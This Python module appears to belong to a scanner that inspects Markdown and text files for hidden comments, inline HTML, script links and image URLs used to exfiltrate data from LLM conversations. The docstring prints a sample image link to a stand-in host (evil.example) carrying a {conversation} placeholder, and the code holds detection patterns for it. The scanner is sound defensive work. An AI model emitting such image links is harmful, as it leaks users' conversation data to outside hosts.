"""Markdown and plain text (also CSV, JSON, logs...).

Markdown hides text in HTML comments and `[//]: # (...)` link definitions, and inline HTML can carry
hidden spans or scripts. Image links are a known exfiltration channel once an LLM echoes them
(`![](https://evil.example/?q={conversation})`)."""
from __future__ import annotations

import re
from urllib.parse import urlparse

from ..content import content_findings
from ..findings import Finding, Report, clip
from .html import _decode, scan_html

FENCE = re.compile(r"(^|\n)(```|~~~)[^\n]*\n.*?(\n\2[ \t]*(?=\n|$)|$)", re.S)
INLINE_CODE = re.compile(r"`[^`\n]+`")
HTML_COMMENT = re.compile(r"<!--(.*?)-->", re.S)
MD_COMMENT = re.compile(r"^\s{0,3}\[(?://|comment|_)?[^\]]*\]:\s*(?:#|<>)\s*[\"'(](.*?)[\"')]\s*$", re.M)
LINK = re.compile(r"(!?)\[([^\]]*)\]\(\s*<?([^)\s>]+)>?(?:\s+[\"']([^\"']*)[\"'])?\s*\)")
REF_DEF = re.compile(r"^\s{0,3}\[[^\]]+\]:\s*<?(\S+?)>?(?:\s+[\"'(](.*?)[\"')])?\s*$", re.M)
TAG = re.compile(r"</?[a-zA-Z][\w-]*(\s[^<>]*)?/?>")
PLACEHOLDER = re.compile(r"\{[^}]{1,40}\}|\$\{|\[(DATA|INFO|SECRET|CONTEXT|HISTORY|SUMMARY)\]|%7B|<[A-Z_]{3,}>", re.I)


def scan_text(raw: bytes | str, name: str = "<bytes>", *, markdown: bool = True) -> Report:
    text = raw if isinstance(raw, str) else _decode(raw)
    rep = Report(path=name, format="markdown" if markdown else "text", pages=1)

    codes: list[str] = []

    def stash(m):
        codes.append(m.group(0))
        return f"\x00{len(codes) - 1}\x00"

    work = FENCE.sub(stash, text) if markdown else text
    work = INLINE_CODE.sub(stash, work) if markdown else work

    hidden = [("html_comment", m.group(1)) for m in HTML_COMMENT.finditer(work)]
    work = HTML_COMMENT.sub(" ", work)
    if markdown:
        hidden += [("markdown_comment", m.group(1)) for m in MD_COMMENT.finditer(work)]
        work = MD_COMMENT.sub("", work)

    if TAG.search(work):
        sub = scan_html(work, name)
        rep.findings += [f for f in sub.findings if f.check not in ("scripts",) and f.reason != "visible text"
                         and not (f.check == "prompt_injection" and f.reason == "visible text")]
        visible = sub.safe_text
    else:
        visible = work
    visible = re.sub(r"\x00(\d+)\x00", lambda m: codes[int(m.group(1))], visible)

    for ch, t in hidden:
        rep.findings += content_findings(t, ch, hidden=True, side_channel="low" if len(t.strip()) >= 40 else None)

    if markdown:
        for bang, label, url, title in LINK.findall(work):
            _link(rep, url, bool(bang), label, title)
        for url, title in REF_DEF.findall(work):
            _link(rep, url, False, "", title)

    rep.safe_pages = [visible]
    rep.raw_pages = [text]
    rep.findings += content_findings(visible, "visible text", hidden=False)
    return rep


def _link(rep, url, is_image, label, title):
    low = url.strip().lower()
    if low.startswith(("javascript:", "vbscript:", "data:text/html", "data:application")):
        rep.findings.append(Finding(check="javascript_url", severity="high", text=clip(url, 100),
                                    message="link runs script or loads an inline document"))
        return
    if title:
        rep.findings += content_findings(title, "link title", hidden=True)
    if is_image and label:
        rep.findings += content_findings(label, "image alt text", hidden=True)
    u = urlparse(url)
    if is_image and u.scheme in ("http", "https") and u.query:
        if PLACEHOLDER.search(url):
            rep.findings.append(Finding(check="exfiltration_image", severity="high", text=clip(url, 120),
                                        message="image URL with a template placeholder in its query "
                                                "(data-exfiltration pattern when an LLM renders it)"))
        elif len(u.query) > 200:
            rep.findings.append(Finding(check="exfiltration_image", severity="medium", text=clip(url, 120),
                                        message="image URL with a very long query string"))
